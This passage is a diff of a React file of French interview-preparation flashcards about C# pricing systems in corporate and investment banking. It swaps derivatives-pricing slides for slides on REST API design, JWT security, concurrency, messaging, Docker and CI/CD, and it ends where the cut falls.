@@ -1,661 +1,566 @@
-// src/projects/CIBPricing/CIBPricingPreTradeQCM.js
+// src/projects/CIBPricing/CIBRestApiInfraQCM.js
 
 import React, { useState, useEffect, useCallback } from "react";
 import "./Page.css";
 
 const basicSlides = [
   {
-    "question": "Vue d'ensemble — Développeur C# Pricing Pre-Trade / Equity Derivatives CIB",
-    "answer": "**Domaine fonctionnel** : Equity Derivatives — options vanilles (Call/Put), produits structurés (Autocall, Barrier), Greeks (Delta/Gamma/Vega/Theta), surface de volatilité implicite, pricing pré-trade. ◆ **Architecture technique** : C#/.NET Framework 4.8 + .NET 8, REST API ASP.NET Core, SQL Server, Sophis/RISQUE comme référentiel, DataSynapse pour le calcul distribué. ◆ **Messaging** : MSMQ (legacy, .NET Framework) et RabbitMQ (moderne, AMQP) pour la communication inter-services. ◆ **Performance** : Multithreading (`Task.WhenAll`, `Parallel.For`, `Channel<T>`), gestion mémoire (Span<T>, ArrayPool, `IDisposable`). ◆ **DevOps** : Azure DevOps pipelines CI/CD, TFS (Team Foundation Server), sécurité API REST (JWT, OAuth2, HTTPS). ◆ **ISIN & Booking** : récupération d'ISIN depuis le référentiel, service de booking via REST API, refactoring et optimisation du référentiel de données."
+    "question": "Vue d'ensemble — API REST C# comme objet central du système MAPS Pricing",
+    "answer": "**L'API REST est le pivot de l'architecture** : point d'entrée unique pour le booking, le pricing, la récupération d'ISIN et la consultation du référentiel. Tous les clients (OMS, blotter, risk) passent par elle. ◆ **Endpoints principaux** : `POST /api/v1/booking` (créer un trade), `GET /api/v1/instruments/{isin}` (consulter le référentiel), `POST /api/v1/pricing/calculate` (déclencher un pricing), `GET /api/v1/pricing/greeks/{tradeId}` (lire les Greeks calculés). ◆ **Pipeline interne** : HTTP Request → Authentication Middleware (JWT) → Authorization Policy → Model Binding + Validation → Controller → Service Layer → MSMQ/RabbitMQ → DataSynapse → SQL Server. ◆ **Performance** : Multithreading (`Task.WhenAll`, `Parallel.For`), gestion mémoire (`ArrayPool`, `Span<T>`), cache Redis, connection pooling SQL. ◆ **Infrastructure** : Docker containers, microservices, Azure DevOps CI/CD, TFS, .NET 4.8 / .NET 8."
   },
   {
-    "question": "Equity Derivatives — Produits et cycle de vie pré-trade",
-    "answer": "**Options vanilles** : Call (droit d'acheter) et Put (droit de vendre) un sous-jacent (action, indice) à un prix fixé (strike) jusqu'à une date d'échéance. Exercice européen (à maturité seulement) ou américain (à tout moment). ◆ **Produits structurés** : Autocall (remboursement anticipé si sous-jacent franchit une barrière à la date d'observation + coupon). Barrier options (activation/désactivation selon un niveau). Capital protected notes. ◆ **Cycle pré-trade** : le trader saisit les paramètres → le système de pricing (MAPS/Sophis) calcule le prix théorique et les Greeks → validation RMS → envoi vers l'OMS. ◆ **ISIN** : International Securities Identification Number — identifiant unique d'un instrument financier (FR0000131104 = BNP Paribas). Prérequis du booking."
+    "question": "REST API ASP.NET Core — Anatomie d'un endpoint de booking CIB",
+    "answer": "**Controller** : `[ApiController][Route(\"api/v1/booking\")] public class BookingController : ControllerBase`. ◆ **Endpoint** : `[HttpPost][Authorize(Policy=\"CanBook\")] public async Task<IActionResult> BookTrade([FromBody] BookingRequest request, CancellationToken ct)`. ◆ **Pipeline complet** : `[HttpPost]` → ModelState validation automatique (`[ApiController]`) → `[Authorize]` vérifie JWT → `BookingRequest` désérialisé depuis le body JSON → FluentValidation → `_bookingService.BookAsync(request, ct)` → `Created(uri, response)` ou `BadRequest(errors)`. ◆ **Codes retour** : 201 Created (booking OK), 400 Bad Request (validation échoue), 401 Unauthorized (JWT absent/invalide), 403 Forbidden (rôle insuffisant), 409 Conflict (idempotency key déjà utilisée), 503 Service Unavailable (Sophis down, circuit ouvert). ◆ **Versioning URL** : `/api/v1/` — jamais modifier v1, créer `/api/v2/` pour les breaking changes."
   },
   {
-    "question": "Greeks — Delta, Gamma, Vega, Theta, Rho",
-    "answer": "**Delta (Δ)** : sensibilité du prix de l'option au prix du sous-jacent. `∂V/∂S`. Call Delta ∈ [0,1], Put Delta ∈ [-1,0]. Utilité : delta hedging. ◆ **Gamma (Γ)** : taux de variation du Delta. `∂²V/∂S²`. Mesure la convexité — élevé près du strike à maturité. ◆ **Vega (ν)** : sensibilité au niveau de volatilité implicite. `∂V/∂σ`. Critique pour les desks vol. ◆ **Theta (Θ)** : valeur temps perdue par jour. `∂V/∂t`. Négatif pour les options longues (time decay). ◆ **Rho (ρ)** : sensibilité au taux d'intérêt. `∂V/∂r`. Moins critique en equity. ◆ **Calcul C#** : différences finies — `delta = (Price(S+dS) - Price(S-dS)) / (2*dS)`. Calcul parallèle via `Task.WhenAll`."
+    "question": "Sécurité API REST — JWT, Policies, HTTPS, validation dans MAPS",
+    "answer": "**JWT Bearer** : `services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(o => { o.TokenValidationParameters = new TokenValidationParameters { ValidIssuer = config[\"Jwt:Issuer\"], ValidAudience = \"maps-api\", IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(config[\"Jwt:Secret\"])), ValidateLifetime = true }; });` ◆ **Policies** : `services.AddAuthorization(o => { o.AddPolicy(\"CanBook\", p => p.RequireRole(\"TRADER\", \"SALES\")); o.AddPolicy(\"EquityDesk\", p => p.RequireClaim(\"desk\", \"equity\")); });` ◆ **HTTPS** : `app.UseHsts(); app.UseHttpsRedirection();` — TLS 1.2+ obligatoire en CIB. ◆ **Validation** : `[ApiController]` retourne 400 automatiquement si ModelState invalide. FluentValidation pour les règles métier (Strike > 0, Maturity > Today, ISIN format). ◆ **Audit MiFID II** : chaque requête enrichie du claim `userId` pour le logging structuré."
   },
   {
-    "question": "Black-Scholes — Modèle et implémentation C#",
-    "answer": "**Formule** : `C = S·N(d1) - K·e^(-rT)·N(d2)` avec `d1 = (ln(S/K) + (r + σ²/2)T) / σ√T`, `d2 = d1 - σ√T`. ◆ **Inputs** : S (spot), K (strike), r (taux sans risque), σ (volatilité implicite), T (maturité en années). ◆ **Implémentation C#** : `public static class BlackScholes { public static decimal Call(decimal S, decimal K, decimal r, decimal sigma, decimal T) { var d1 = (Math.Log((double)(S/K)) + (double)((r + sigma*sigma/2)*T)) / (double)(sigma*Math.Sqrt((double)T)); var d2 = d1 - (double)(sigma*Math.Sqrt((double)T)); return S * (decimal)NormalCDF(d1) - K * (decimal)Math.Exp(-(double)(r*T)) * (decimal)NormalCDF(d2); } }` ◆ **Limites** : volatilité constante (non respectée en pratique), pas de dividendes (correction Merton). Utilisé comme base de référence et pour extraire la vol implicite."
+    "question": "Gestion de N endpoints — Versioning, routing, middlewares",
+    "answer": "**Routing attributs** : `[Route(\"api/v{version:apiVersion}/[controller]\")]` + `services.AddApiVersioning()`. ◆ **Endpoints multiples** : `BookingController` (POST /booking), `InstrumentController` (GET /instruments/{isin}, GET /instruments?underlyingId={id}&type={type}), `PricingController` (POST /pricing/calculate, GET /pricing/greeks/{id}, GET /pricing/status/{jobId}), `ReferentielController` (GET /referentiel/instruments, POST /referentiel/instruments/sync). ◆ **Middleware pipeline** : `UseRouting` → `UseAuthentication` → `UseAuthorization` → `UseRateLimiting` → `MapControllers`. ◆ **Rate limiting** : `services.AddRateLimiter(o => o.AddFixedWindowLimiter(\"api\", opt => { opt.PermitLimit = 100; opt.Window = TimeSpan.FromMinutes(1); }));` ◆ **Health checks** : `GET /health` (liveness), `GET /health/ready` (readiness — Sophis up + SQL accessible + Redis disponible). Docker probe utilise ces endpoints."
   },
   {
-    "question": "Surface de volatilité implicite — Construction et utilisation",
-    "answer": "**Définition** : grille 3D σ(K, T) — volatilité implicite extraite par inversion Black-Scholes pour chaque option cotée sur le marché. Axes : Strike (ou moneyness) × Maturité. ◆ **Construction** : pour chaque option cotée, résoudre `MarketPrice = BlackScholes(S, K, r, σ_impl, T)` par algorithme de Newton-Raphson ou bissection. ◆ **Interpolation C#** : `public decimal GetVol(decimal strike, DateTime expiry) => BilinearInterpolate(_grid, strike, expiry)` — jamais extrapoler sans vérification. ◆ **Smile et skew** : le skew (pente en strike) reflète la prime de risque de baisse. Le smile (forme en U) reflète les queues épaisses. ◆ **Arbitrage-free** : la surface doit respecter les conditions calendar-spread (σ croissante en T) et butterfly-spread (convexité en K). ◆ **Usage** : entrée principale du moteur de pricing MAPS/Sophis."
-  },
-  {
-    "question": "C# — Architecture d'une classe Option avec abstraction et getters filtrés",
-    "answer": "**Classe abstraite** : `abstract class BaseOption { protected decimal _strike; protected DateTime _expiry; protected decimal _notional; public abstract decimal Price(MarketData md); public abstract Greeks ComputeGreeks(MarketData md); public decimal Strike => _strike > 0 ? _strike : throw new DomainException(\"Strike must be positive\"); }` ◆ **Getters filtrés** : protègent les invariants métier sans validation externe. `public decimal Notional => _notional > 0 ? _notional : throw new DomainException(\"Notional must be positive\");` ◆ **Implémentations** : `class EuropeanCall : BaseOption`, `class AutocallNote : BaseOption`, `class BarrierOption : BaseOption`. ◆ **Polymorphisme** : `List<BaseOption> book; Parallel.ForEach(book, opt => results.Add(opt.Price(md)));` ◆ **Factory** : `OptionFactory.Create(type, params)` — jamais de `new EuropeanCall()` directement dans les services."
-  },
-  {
-    "question": "REST API ASP.NET Core — Service de booking et récupération d'ISIN",
-    "answer": "**Service Booking** : `[ApiController][Route(\"api/v1/booking\")] public class BookingController : ControllerBase { [HttpPost] public async Task<IActionResult> BookTrade([FromBody] BookingRequest req) { var isin = await _isinService.ResolveAsync(req.InstrumentId); var result = await _bookingService.BookAsync(isin, req); return result.IsSuccess ? Ok(result.TradeId) : BadRequest(result.Error); } }` ◆ **Service ISIN** : `public class IsinService : IIsinService { private readonly IMemoryCache _cache; public async Task<string> ResolveAsync(string instrumentId) { return await _cache.GetOrCreateAsync($\"isin:{instrumentId}\", async entry => { entry.SlidingExpiration = TimeSpan.FromMinutes(30); return await _referentielRepo.GetIsinAsync(instrumentId); }); } }` ◆ **Sécurité** : JWT Bearer + HTTPS + validation des inputs. ◆ **Versioning** : `/api/v1/` — backward compatible."
-  },
-  {
-    "question": "Multithreading C# — Patterns pour le Pricing Pre-Trade",
-    "answer": "**`Task.WhenAll`** : calcul simultané des Greeks. `await Task.WhenAll(ComputeDeltaAsync(opt, md), ComputeVegaAsync(opt, md), ComputeThetaAsync(opt, md))` — les trois partent en parallèle, résultat quand le plus lent finit. ◆ **`Parallel.For`** : Monte Carlo pour VaR. `Parallel.For(0, N_SIMS, i => { payoffs[i] = SimulatePath(option, md); })` — utilise tous les cœurs CPU. ◆ **`Channel<T>`** : pipeline de pricing lock-free. `Channel<PricingRequest>.Writer.WriteAsync(req)` depuis l'API, `ReadAllAsync()` dans le moteur. ◆ **`ConcurrentDictionary`** : cache thread-safe des vols implicites. `_volCache.GetOrAdd(key, _ => ComputeImpliedVol(key))` ◆ **Règle** : jamais de `.Result` ou `.Wait()` dans un contexte async (deadlock). Jamais de `Thread.Sleep()` dans un hot path."
+    "question": "Multithreading C# — Pipeline de pricing haute performance",
+    "answer": "**`async/await` (I/O-bound)** : libère le thread pendant l'attente réseau/DB. `var isin = await _isinService.ResolveAsync(id, ct)` — le thread HTTP sert d'autres requêtes pendant l'appel Sophis. ◆ **`Task.WhenAll` (parallélisme logique)** : `var (greeks, position, limit) = await (ComputeGreeksAsync(), GetPositionAsync(), CheckLimitAsync()).WhenAll()` — les 3 appels partent simultanément, résultat quand le plus lent finit. ◆ **`Parallel.For` (CPU-bound)** : `Parallel.For(0, N_SIMS, new ParallelOptions { MaxDegreeOfParallelism = Environment.ProcessorCount }, i => { payoffs[i] = SimulatePath(option, md); });` ◆ **`Channel<T>` (pipeline)** : `Channel<PricingRequest>.CreateBounded(new BoundedChannelOptions(1000) { FullMode = BoundedChannelFullMode.Wait })` — backpressure native, remplace les `ConcurrentQueue` avec polling. ◆ **`CancellationToken`** : propagé depuis le `HttpContext.RequestAborted` jusqu'aux appels SQL/Sophis — annulation propre si le client ferme la connexion."
   },
   {
     "question": "Gestion mémoire C# — Optimisation du référentiel de données",
-    "answer": "**`Span<T>` et `Memory<T>`** : manipulation de tableaux sans allocation heap. `Span<double> prices = stackalloc double[100];` — idéal pour les calculs de Greeks sur de petits arrays. ◆ **`ArrayPool<T>`** : réutilisation de buffers pour éviter la pression GC. `var buffer = ArrayPool<double>.Shared.Rent(N_SIMS); try { /* calcul Monte Carlo */ } finally { ArrayPool<double>.Shared.Return(buffer); }` ◆ **`IDisposable` / `using`** : libération des ressources non managées (connexions SQL, streams). `using var conn = new SqlConnection(cs);` ◆ **GC tuning** : `GCSettings.LatencyMode = GCLatencyMode.LowLatency` pendant les fenêtres de marché critiques. ◆ **Object pooling** : `ObjectPool<PricingEngine>` pour les instances coûteuses à créer. ◆ **Struct vs class** : les Greeks (5 doubles) en `struct` évitent l'allocation heap et la pression GC."
+    "answer": "**`Span<T>` / `ReadOnlySpan<T>`** : manipulation de données sans allocation heap. `ReadOnlySpan<char> isinSpan = isin.AsSpan(); var prefix = isinSpan.Slice(0, 2);` — zéro allocation pour parser les ISIN. ◆ **`ArrayPool<T>`** : `var buf = ArrayPool<double>.Shared.Rent(252); try { /* Monte Carlo path */ } finally { ArrayPool<double>.Shared.Return(buf); }` — pool de buffers réutilisés, GC pressure proche de zéro. ◆ **`struct` pour les Greeks** : `readonly struct Greeks { public decimal Delta; public decimal Gamma; public decimal Vega; public decimal Theta; }` — alloué sur la stack, pas sur le heap. ◆ **`IDisposable` / `using`** : `using var conn = new SqlConnection(cs);` — libération immédiate des connexions non managées. ◆ **`ObjectPool<T>`** : `services.AddSingleton<ObjectPool<PricingContext>>(sp => new DefaultObjectPool<PricingContext>(new PricingContextPolicy()))` — réutilisation des contextes de pricing coûteux à créer."
   },
   {
-    "question": "MSMQ vs RabbitMQ — Messaging dans l'environnement CIB",
-    "answer": "**MSMQ (Microsoft Message Queuing)** : legacy Windows, .NET Framework. Messaging transactionnel, persistance locale, pas de broker centralisé. `MessageQueue mq = new MessageQueue(\".\\\\Private$\\\\PricingRequests\"); mq.Send(request);` — déprécié, non cloud-native, difficile à scaler. ◆ **RabbitMQ (AMQP)** : broker centralisé, exchanges et queues découplés, bindings flexibles, acknowledgements, dead-letter queues. `IConnection → IChannel → channel.BasicPublish(exchange, routingKey, body)`. ◆ **Migration MSMQ → RabbitMQ** : abstraction `IMessageBus` injectée — le code métier ne connaît pas l'implémentation. ◆ **Patterns RabbitMQ** : Direct (routage exact), Topic (wildcard), Fanout (broadcast). Dead-letter queue pour les messages en erreur. ◆ **Dans MAPS** : events `PricingRequested`, `GreeksComputed`, `BookingConfirmed` sur des topics dédiés."
+    "question": "LINQ — Requêtes sur les instruments et positions dans MAPS",
+    "answer": "**LINQ to Objects** : `var equityOptions = instruments.Where(i => i.Type == InstrumentType.Option && i.Underlying.AssetClass == AssetClass.Equity).OrderBy(i => i.Maturity).Select(i => new InstrumentDto(i.Isin, i.Strike, i.Maturity)).ToList();` ◆ **LINQ to SQL (Dapper)** : `var result = await conn.QueryAsync<Instrument>(\"SELECT ISIN, Strike, Maturity FROM Instruments WHERE UnderlyingId = @id AND Type = @type\", new { id, type });` ◆ **LINQ to EF Core** : `var trades = await _context.Trades.Include(t => t.Instrument).Where(t => t.DeskId == deskId && t.TradeDate >= DateTime.Today).AsNoTracking().ToListAsync();` ◆ **Performance LINQ** : `AsNoTracking()` pour les lectures seules (évite le change tracking). `IQueryable<T>` vs `IEnumerable<T>` — ne jamais `.ToList()` avant le filtre (charge tout en mémoire). `.Any()` plutôt que `.Count() > 0`. `Select()` avant `ToList()` pour réduire les colonnes SQL. ◆ **GroupBy** : `trades.GroupBy(t => t.Desk).Select(g => new { Desk = g.Key, TotalNotional = g.Sum(t => t.Notional) })`"
   },
   {
-    "question": "Sophis RISQUE / DataSynapse — Contexte applicatif",
-    "answer": "**Sophis RISQUE** : référentiel de marché et de positions pour les dérivés actions et taux. Stocke les instruments (options, structurés), les trades, les positions, les données de marché (prix, vols). API COM/C# pour l'intégration. Souvent utilisé comme source de vérité pour les ISIN et les caractéristiques des instruments. ◆ **DataSynapse GridServer** : middleware de calcul distribué — répartit les tâches de pricing sur une grille de serveurs de calcul. Le service C# soumet des jobs (`PricingJob`) et récupère les résultats de manière asynchrone. ◆ **Pattern** : `IDataSynapseClient.SubmitJob(job) → jobId → PollResult(jobId) → Greeks[]` ◆ **Alternative moderne** : Azure Batch ou Kubernetes Jobs pour le calcul distribué. ◆ **MAPS** : plateforme de pricing propriétaire intégrant Sophis comme référentiel et DataSynapse pour le calcul."
+    "question": "MSMQ vs RabbitMQ — Choix et migration dans MAPS",
+    "answer": "**MSMQ** : `System.Messaging.MessageQueue mq = new MessageQueue(\".\\\\Private$\\\\PricingQueue\"); mq.Send(new Message(request) { Formatter = new XmlMessageFormatter() });` Windows uniquement, .NET Framework 4.8, transactionnel local, pas de broker, difficile à monitorer. ◆ **RabbitMQ** : `IChannel channel = await connection.CreateChannelAsync(); await channel.BasicPublishAsync(exchange: \"maps\", routingKey: \"pricing.request\", body: JsonSerializer.SerializeToUtf8Bytes(request));` Broker centralisé AMQP, exchanges flexibles, dead-letter queues, plugins de monitoring, multi-langage, cloud-native. ◆ **Abstraction `IMessageBus`** : `interface IMessageBus { Task PublishAsync<T>(string routingKey, T message, CancellationToken ct); }` — `MsmqMessageBus` (net48), `RabbitMqMessageBus` (net8.0). Le code métier ne change pas lors de la migration. ◆ **Dead-letter queue RabbitMQ** : `channel.QueueDeclare(\"pricing.dlq\", arguments: new Dictionary<string,object>{{ \"x-dead-letter-exchange\", \"maps.dlx\" }})` — les messages rejetés (ISIN invalide, timeout) sont inspectables et rejouables."
   },
   {
-    "question": "Sécurité API REST — JWT, OAuth2, HTTPS dans le contexte CIB",
-    "answer": "**JWT Bearer** : `[Authorize] [HttpPost(\"booking\")] public IActionResult Book(...)` — le middleware ASP.NET Core valide le token à chaque requête. Token contient : userId, desk, rôles (TRADER, RISK, BACKOFFICE), expiration. ◆ **OAuth2 / OpenID Connect** : le trader s'authentifie via l'IdP de la banque (AD FS, Okta). Le token est délégué aux services MAPS. ◆ **HTTPS obligatoire** : toutes les API REST en CIB sont sur TLS 1.2+. ◆ **Autorisation fine** : `[Authorize(Policy = \"CanBook\")] [Authorize(Policy = \"EquityDesk\")]` — un trader actions ne peut pas booker sur le desk taux. ◆ **Validation des inputs** : `[ApiController]` + FluentValidation pour les `BookingRequest`. ◆ **Audit trail** : chaque booking logué avec userId, timestamp, instrument, notional — réglementation MiFID II."
+    "question": "Microservices — Découpage de MAPS en services indépendants",
+    "answer": "**Services identifiés** : `InstrumentService` (ISIN, référentiel, cache), `PricingService` (Black-Scholes, Heston, Monte Carlo via DataSynapse), `BookingService` (création trade dans Sophis), `RiskService` (Greeks, limites, VaR), `MarketDataService` (spots, vols, taux depuis Bloomberg/Reuters). ◆ **Communication** : synchrone REST (booking → instrument via `HttpClient` typé), asynchrone RabbitMQ (pricing → risk via événements `PricingCompleted`). ◆ **API Gateway** : point d'entrée unique devant tous les microservices — authentification centralisée, rate limiting, routing. `Ocelot` ou `YARP` (Yet Another Reverse Proxy) en C#. ◆ **Problème shared DB** : chaque microservice a sa propre DB (DB per service pattern) — `InstrumentService` → `InstrumentsDb`, `BookingService` → `BookingDb`. Pas de joins cross-services. ◆ **Service discovery** : `Consul` ou Kubernetes Services pour que `BookingService` trouve `InstrumentService` dynamiquement."
   },
   {
-    "question": "Azure DevOps & TFS — Pipelines CI/CD pour MAPS",
-    "answer": "**TFS (Team Foundation Server)** : source control legacy de Microsoft (TFVC ou Git), work items, builds. ◆ **Azure DevOps** : évolution cloud de TFS — Repos (Git), Pipelines (CI/CD), Boards (Agile), Artifacts (NuGet). ◆ **Pipeline CI MAPS** : `trigger: [main, release/*] → steps: dotnet restore → dotnet build → dotnet test → publish artifacts`. ◆ **Pipeline CD** : artifacts → déploiement IIS/Kubernetes → smoke tests → validation UAT. ◆ **Multi-target** : `<TargetFrameworks>net48;net8.0</TargetFrameworks>` — compilé pour .NET Framework 4.8 (Sophis legacy) ET .NET 8 (nouveaux services). ◆ **NuGet packages** : référentiels internes pour les librairies partagées (pricing models, messaging abstractions). ◆ **Feature branches** : `feature/booking-rest-api` → PR → code review → merge main → CI automatique."
+    "question": "Docker — Containerisation des services MAPS",
+    "answer": "**Dockerfile multi-stage** : `FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build; COPY . .; RUN dotnet publish -c Release -o /app; FROM mcr.microsoft.com/dotnet/aspnet:8.0 AS runtime; COPY --from=build /app .; ENTRYPOINT [\"dotnet\", \"Maps.BookingService.dll\"]` ◆ **Docker Compose dev** : `services: booking-api: build: . ports: [\"5001:8080\"] depends_on: [sql-server, rabbitmq, redis] environment: [ConnectionStrings__Default=..., Jwt__Secret=...]` ◆ **Health checks Docker** : `HEALTHCHECK --interval=30s --timeout=5s CMD curl -f http://localhost:8080/health || exit 1` — Docker/Kubernetes redémarre le container si unhealthy. ◆ **Multi-target** : `FROM mcr.microsoft.com/dotnet/framework/aspnet:4.8 AS runtime-legacy` pour le service Sophis (net48 Windows). ◆ **Volumes** : logs et config montés en volume, pas dans l'image. Secrets via variables d'environnement ou Kubernetes Secrets. ◆ **Image size** : `alpine` base image pour .NET 8, `--no-restore` trick pour optimiser les layers."
   },
   {
-    "question": "SQL Server — Référentiel de données et optimisation",
-    "answer": "**Référentiel instruments** : tables `Instruments` (ISIN, type, sous-jacent, maturité, strike), `MarketData` (spots, taux, divs), `Positions` (desk, trader, quantité), `Trades` (booking, statut, contrepartie). ◆ **Index stratégiques** : `CREATE INDEX IX_Instruments_ISIN ON Instruments(ISIN) INCLUDE (Strike, Maturity, UnderlyingId)` — covering index pour les requêtes de pricing. ◆ **Stored procedures** : `usp_GetInstrumentByISIN` — logique SQL encapsulée, plan d'exécution mis en cache. ◆ **Connection pooling** : `SqlConnection` réutilise les connexions du pool — ne jamais créer de connexion par requête de pricing. ◆ **async/await SQL** : `await conn.QueryAsync<Instrument>(sql, params)` avec Dapper — libère le thread pendant l'I/O. ◆ **ISIN lookup** : `SELECT ISIN FROM Instruments WHERE InternalId = @id` — requête la plus fréquente du service de booking, à mettre en cache Redis ou `IMemoryCache`."
+    "question": "Azure DevOps CI/CD — Pipeline MAPS multi-target",
+    "answer": "**Pipeline YAML** : `trigger: branches: include: [main, release/*] stages: [Build, Test, Package, Deploy]` ◆ **Stage Build** : `dotnet restore → dotnet build --configuration Release /p:TreatWarningsAsErrors=true → dotnet test --collect:\"XPlat Code Coverage\" → dotnet publish -o $(Build.ArtifactStagingDirectory)` ◆ **Multi-target build** : `dotnet build -f net48 && dotnet build -f net8.0` — les deux TFMs validés dans la même CI. ◆ **Stage Package** : `docker build -t maps-booking-api:$(Build.BuildId) . → docker push $(ACR)/maps-booking-api:$(Build.BuildId)` ◆ **Stage Deploy UAT** : `kubectl set image deployment/booking-api container=$(ACR)/maps-booking-api:$(Build.BuildId) -n uat` ◆ **Stage Deploy PROD** : gate d'approbation manuelle + smoke test `GET /health` + rollback automatique si smoke test échoue. ◆ **Branch policies** : PR obligatoire, minimum 2 reviewers, build CI doit passer — conformité réglementaire SOX."
   },
   {
-    "question": "Refactoring C# — SOLID appliqué au moteur de pricing",
-    "answer": "**SRP** : séparer `PricingEngine` (calcul) de `PricingRepository` (données) de `PricingNotifier` (messaging). ◆ **OCP** : `IPricingModel` injectée — ajouter `HestonModel` sans modifier `PricingEngine`. Pas de `switch(modelType)` dans le moteur. ◆ **LSP** : `BarrierOption : BaseOption` — partout où `BaseOption` est attendue, `BarrierOption` fonctionne sans surprise. ◆ **ISP** : `IPricer` (Price), `IGreeksCalculator` (ComputeGreeks), `ICalibrator` (Calibrate) — interfaces séparées, pas une mega-interface. ◆ **DIP** : le moteur dépend de `IPricingModel`, `IMarketDataRepository`, `IMessageBus` — jamais des classes concrètes. Injection via constructeur. ◆ **Refactoring Sophis** : extraire l'accès Sophis derrière `ISophisAdapter` — testable via mock, remplaçable sans modifier la logique métier."
+    "question": "Techniques d'optimisation — Choix et trade-offs en C# CIB",
+    "answer": "**Cache multi-niveaux** : L1 `ConcurrentDictionary` (< 0.1ms, hot path ISIN), L2 `IMemoryCache` (< 1ms, TTL 30min), L3 Redis `IDistributedCache` (< 2ms, multi-instances), L4 SQL Server (fallback, 10-100ms). ◆ **Choix async vs Parallel** : `async/await` pour I/O-bound (DB, Sophis, HTTP), `Parallel.For` pour CPU-bound (Monte Carlo, Greeks par différences finies). Ne pas mélanger : `async` dans `Parallel.For` = deadlock potentiel. ◆ **`record` vs `class` vs `struct`** : `record` pour les DTOs immuables (BookingRequest, GreeksResult), `class` pour les entités avec cycle de vie (PricingContext), `struct` pour les types valeur légers (Greeks, Point). ◆ **Connection pooling SQL** : `MaxPoolSize=100` dans la connection string — jamais ouvrir une connexion par requête de pricing. ◆ **EF Core vs Dapper** : EF Core pour les writes complexes avec transactions (booking), Dapper pour les reads haute performance (référentiel ISIN, 1000 req/sec)."
   },
   {
-    "question": "Monte Carlo — Pricing de produits structurés en C#",
-    "answer": "**Principe** : simuler N chemins de prix pour le sous-jacent, calculer le payoff sur chaque chemin, actualiser la moyenne. ◆ **Simulation GBM** : `S(t+dt) = S(t) * exp((r - σ²/2)*dt + σ*√dt*Z)` avec Z ~ N(0,1). ◆ **Implémentation C#** : `decimal[] payoffs = new decimal[N]; Parallel.For(0, N, i => { var path = GeneratePath(S0, r, sigma, T, steps); payoffs[i] = payoff.Compute(path); }); decimal price = payoffs.Average() * DiscountFactor(r, T);` ◆ **ArrayPool** : `var buffer = ArrayPool<double>.Shared.Rent(steps)` pour éviter l'allocation de N×steps doubles sur le heap. ◆ **Corrélations** : décomposition de Cholesky pour les options basket (corrélations entre sous-jacents). ◆ **DataSynapse** : les N simulations réparties sur la grille de calcul — chaque nœud traite un batch de chemins."
+    "question": "Patterns d'API REST — Idempotence, pagination, filtering, HATEOAS",
+    "answer": "**Idempotence** : `[HttpPost] public async Task<IActionResult> BookTrade([FromHeader(Name=\"Idempotency-Key\")] string idempotencyKey, [FromBody] BookingRequest req)` — vérifier la clé en base avant de booker. 409 Conflict si déjà traitée. ◆ **Pagination** : `GET /api/v1/instruments?page=2&pageSize=50&sortBy=maturity&sortDir=asc` → `{ data: [...], totalCount: 1200, page: 2, pageSize: 50, hasNext: true }`. Cursor-based pour les gros volumes. ◆ **Filtering** : `GET /api/v1/instruments?underlyingId=BNPP&type=Call&maturityFrom=2025-01-01&strike=55` → LINQ dynamique ou `Specifications pattern`. ◆ **Partial update** : `PATCH /api/v1/booking/{id}` avec `JsonPatchDocument<BookingRequest>` — ne modifier que les champs envoyés. ◆ **Async long-running** : `POST /api/v1/pricing/calculate` → 202 Accepted + `{ jobId: \"...\", statusUrl: \"/api/v1/pricing/status/{jobId}\" }` → `GET /api/v1/pricing/status/{jobId}` → 200 + résultats ou 202 si encore en cours."
   },
   {
-    "question": "Autocall — Structure, barrières et payoff C#",
-    "answer": "**Définition** : produit structuré qui rembourse le capital + coupon si le sous-jacent dépasse un niveau barrière à une date d'observation. Sinon, continue jusqu'à la prochaine date. ◆ **Dates d'observation** : typiquement trimestrielles ou annuelles. Barrière autocall souvent à 100% ou 110% du spot initial. ◆ **Protection capital** : barrière de protection (ex: 60% du spot initial) — si le sous-jacent ne franchit jamais ce niveau, le capital est protégé. ◆ **Payoff C#** : `public decimal ComputePayoff(decimal[] path) { for(int i = 0; i < _obsDates.Length; i++) { if(path[_obsDates[i]] >= _autocallBarrier) return _notional * (1 + _coupon * (i+1)); } if(path.Last() >= _protectionBarrier) return _notional; return _notional * path.Last() / _initialSpot; }` ◆ **Greeks** : Delta négatif si structure protection (short put implicite). Vega élevé. Theta positif (coupon s'accumule). ◆ **Pricing** : Monte Carlo ou PDE selon la complexité."
+    "question": "SQL Server + Dapper + EF Core — Stratégies d'accès données dans MAPS",
+    "answer": "**Dapper (lectures haute fréquence)** : `var instruments = await conn.QueryAsync<InstrumentDto>(\"SELECT ISIN, Strike, Maturity, UnderlyingId FROM Instruments WITH(NOLOCK) WHERE UnderlyingId = @id\", new { id }, commandTimeout: 3);` — SQL brut, mapping direct, < 1ms avec index. ◆ **EF Core (écritures transactionnelles)** : `using var tx = await _context.Database.BeginTransactionAsync(); _context.Trades.Add(trade); _context.AuditLogs.Add(auditEntry); await _context.SaveChangesAsync(); await tx.CommitAsync();` ◆ **Repository pattern** : `IInstrumentRepository` (Dapper impl), `ITradeRepository` (EF Core impl) — le service ne sait pas quel ORM. ◆ **Index stratégiques** : `CREATE INDEX IX_Instruments_ISIN ON Instruments(ISIN) INCLUDE(Strike, Maturity, Type)` — covering index, zéro key lookup. `CREATE INDEX IX_Trades_DeskDate ON Trades(DeskId, TradeDate DESC)` — requêtes de blotter. ◆ **Bulk insert** : `SqlBulkCopy` ou EF Core `BulkInsert` pour les syncs referentiel (milliers de lignes)."
   },
   {
-    "question": "Gestion des erreurs et patterns de résilience en C# CIB",
